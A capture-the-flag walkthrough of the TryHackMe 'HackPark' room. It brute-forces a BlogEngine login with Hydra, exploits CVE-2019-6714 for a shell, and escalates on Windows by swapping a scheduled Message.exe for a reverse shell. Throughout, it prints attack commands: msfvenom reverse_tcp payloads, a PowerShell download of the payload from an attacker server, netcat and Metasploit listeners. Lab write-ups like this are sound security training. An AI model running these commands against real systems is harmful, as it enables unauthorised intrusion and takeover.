# HackPark

[TOC]

## Introduction

According to THM "This room will cover brute-forcing an accounts credentials, handling public exploits, using the Metasploit framework and privilege escalation on Windows".

Let's get started!

## Service Scanning

After deploying the machine the first order of business would be performing a port scan on the target in order to check for active services.

```
nmap $ip
```

> Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-20 15:42 EST
> Nmap scan report for 10.10.121.195
> Host is up (0.046s latency).
> Not shown: 998 filtered tcp ports (no-response)
> PORT     STATE SERVICE
> **80/tcp   open  http**
> **3389/tcp open  ms-wbt-server**

We can see that the target is hosting RDP and HTTP. Since we do not have credentials to log in via RDP, let us explore the web page.

We can navigate to the web server using http://$ip.

![image-20230220160108546](./images/image-20230220160108546.png)

**Question** What is the name of the clown displayed on the homepage?

> Pennywise

We can save the image and perform a reverse image search to easily find out the answer to this question (eg: using Google Reverse image search by pressing the camera icon below).

![image-20230220160353063](./images/image-20230220160353063.png)



## Using Hydra to Brute-force a login

The web page has a log in page which can be accessible after providing correct username and password credentials.

![image-20230220160851129](./images/image-20230220160851129.png)

**Question** What request type is the Windows website login form using?

> Post
>
> If we check the form element it has a method type post.

THM already provides us with the hint that we should use Hydra to brute force the log in credentials to this page.

In order to do this, we need to know the body of the request. We can use the browser or alternatively Burp Suite to achieve this goal.

By going in the **Network Tab**, we can select the Post Request and see the Request specifications, as below.

![image-20230220163025303](./images/image-20230220163025303.png)



Great! Now we just have to build our Hydra command using this information:

```
hydra $ip http-post-form "/Account/login.aspx?ReturnURL=/admin/:__VIEWSTATE=WpID4%2FU5w%2F2%2FqqbnSVa4dh64FAH%2BMtHTZAh2b15CxaXhtdfbgarzcTTAWB5wFqmRq3rzJDUk4jjy9ZVoEIVzOkxmAqKP4PQPqk%2BuV3xVCJB1xMn62TX3wLdsay88KKdPK5A46LbZsXt3%2BMcqx0d8Ss9vWnF6a49s%2FT5UCNNYbyKr3tcs&__EVENTVALIDATION=TrlLhwjD5ZI1cL0Bmbq9OYy3fHFIVndZioS3cGeGANWeyIL3K6zxiIOlUxkyB5pvhmgYUBBY8Em6IsGTyK9cRjOcqiwNcsDhWurDE0dZEtWc2KRDbtWRuMxXyxKcl5CtE0ZVe8KHpeZ2l8bkNvsdmFsLWqJKxqdGndDinJA8A6oHTfGN&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login failed" -l admin -P /usr/share/wordlists/rockyou.txt -f -V 
```

> $ip: The target IP address 
>
> http-post-form: Method which will be used in the requests
>
> /Account/login.aspx?ReturnURL=/admin/: Specify path to attack, the login Post request in our case
>
> __VIEWSTATE .... =Log+in: Body of the requests which contains a ^USER^ and a ^PASS^ fields which will be replaced with wordlists or static values
>
> -l: static username value to use in the requests performed by hydra
>
> -P: Password wordlist of values to use in the requests performed by hydra
>
> -f: Quit after a hit
>
> -V: Verbose output

![image-20230221125501941](./images/image-20230221125501941.png)

Great as you can see we got a hit!

**Question** Guess a username, choose a password wordlist and gain credentials to a user account!

> Redacted



## Compromise the Machine

After logging we can explore a little bit and one of the pieces of information we can extract in the software being used for this backend area as well as its version.

![image-20230221132012622](./images/image-20230221132012622.png)

**Question** Now you have logged into the website, are you able to identify the version of the BlogEngine?

> 3.3.6.0

Now that we know the software version of the backend framework let us search for an existing exploit using searchsploit in the command line or exploit-db.com.

![image-20230221132615672](./images/image-20230221132615672.png)

Great, the last one seems like an interesting one to exploit. Let us open it and check the exploit.

![image-20230221132659725](./images/image-20230221132659725.png)

**Question** What is the CVE?

> CVE-2019-6714

This exploit may seem complicated but it is fairly simple to execute. 

1. Extract the source code, change the IP, port and name the file PostView.ascx

2. Upload the file by editing a post

3. Open a local listener on our attacker machine 

   ```
   nc -lnvp <port>
   ```

4. Execute the uploaded file to connect back to our local port by navigating to http://10.10.10.10/?theme=../../App_Data/files

Now that we have a working shell we can see who the webserver is running as using the `whoami` command.

**Question** Who is the webserver running as?

> iis apppool\blog

## Windows Privilege Escalation - Metasploit

For this we should take our current shell and turn it into a meterpreter one.

Doing this requires generating a **payload with msfvenom** and starting a **local listener using the multi/handler metasploit module**.

Check with the following commands whether the processor/OS is 32-bit or 64-bit.

```
wmic os get osarchitecture

echo %PROCESSOR_ARCHITECTURE%
```

> 64-bit
>
> AMD64

1. First we generate the payload and upload it to the target

   ```
   Attacker:
   msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
   
   python3 -m http.server 80
   
   Target:
   powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:80/shell-name.exe','shell-name.exe')"
   ```

   

2. Next we start a local listener on our machine and execute the payload on the target

   ```
   Attacker:
   use exploit/multi/handler 
   set PAYLOAD windows/x64/meterpreter/reverse_tcp 
   set LHOST your-ip 
   set LPORT listening-port 
   run
   
   Target:
   .\shell_name.exe
   ```



Great now we are running a meterpreter session on the target machine. Running `sysinfo` provides us with some information about the OS of the target.

**Question** What is the OS version of this windows machine?

> Windows 2012 R2 (6.3 Build 9600)

THM mentions we can run Windows-Exploit-Suggester as described below:

```
sysinfo
git clone https://github.com/Riqky/Windows-Exploit-Suggester.git
./windows-exploit-suggester.py --update
./windows-exploit-suggester.py --database created_file.xlsx --ostext "Windows 2012 R2 (6.3 Build 9600)"
```

BUT we are not going to do this, we are going to run winpeas.

```
wget
upload 
shell
.\winPEASx64.exe
```

> WindowsScheduler(Splinterware Software Solutions - System Scheduler Service)[C:\PROGRA~2\SYSTEM~1\WService.exe] - Auto - Running
>     File Permissions: Everyone [WriteData/CreateFiles]
>     Possible DLL Hijacking in binary folder: C:\Program Files (x86)\SystemScheduler (Everyone [WriteData/CreateFiles])
>     System Scheduler Service Wrapper

This particular entry showcases that there is a scheduled service running that we may likely be able to take advantage of.

**Question** What is the name of the abnormal service running?

> WindowsScheduler

If we go into C:\Program Files (x86)\SystemScheduler we can see a bunch of executables. A closer inspection into the Events directory reveals a **log file (20198415519.INI_LOG.txt) which lets us know that the Message.exe binary is executed every 30 seconds with Administrator privileges.** 

![image-20230227115306192](./images/image-20230227115306192.png)

**Question** What is the name of the binary you're supposed to exploit? 

> Message.exe

Hence, if we can change the Message.exe file to launch a reverse shell to a local listener we can have shell with Administrator privileges into the target machine.

We can use the same executable we used to transform our normal shell into a meterpreter one.

```
mv Message.exe Message.bak
mv /Windows/Temp/shell.exe /Program Files (x86)/SystemScheduler/Message.exe
CTRL+Z

run (multi/handler with the same specifications)
```

One minute or so later we have a a shell with Admin privileges, now all we have to do is go to jeff and the Administrator's Desktop folders to read the content of the user and root flag.

**Question** is the user flag (on Jeffs Desktop)?

> Redacted

**Question** What is the root flag?

> Redacted



## Windows Privilege Escalation - Non Metasploit

Alternatively we could also start our reverse shells using netcat and upload files to the target using python and powershell.

1. First we generate the payload and upload it to the target

   ```
   Attacker:
   msfvenom -p windows/shell_reverse_tcp -a x64 LHOST=[IP] LPORT=[PORT] -f exe -o [SHELL NAME].exe
   
   python3 -m http.server 80
   
   Target:
   powershell "(New-Object System.Net.WebClient).Downloadfile('http://<ip>:80/shell-name.exe','shell-name.exe')"
   ```

   

2. Next we start a local listener on our machine and execute the payload on the target

   ```
   Attacker:
   nc -lvnp [PORT]
   
   Target:
   .\shell_name.exe
   ```

**Question** Using winPeas, what was the Original Install time? (This is date and time)

> 8/3/2019, 10:43:23 AM
>
> This information can also be extracted with the **systeminfo** command
